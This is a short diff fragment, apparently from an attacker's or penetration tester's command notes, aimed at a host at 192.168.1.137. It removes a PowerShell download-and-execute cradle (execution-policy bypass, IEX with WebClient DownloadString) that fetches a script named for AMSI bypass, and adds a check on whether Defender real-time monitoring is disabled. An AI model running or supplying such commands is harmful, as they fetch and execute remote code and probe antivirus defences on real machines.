@@ -25,7 +25,7 @@ http://192.168.1.137/payload.ps1
 
 Test-NetConnection 192.168.1.137 -Port 443
 
-powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload_bypass_amsi.ps1')"
+Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
 
 
 
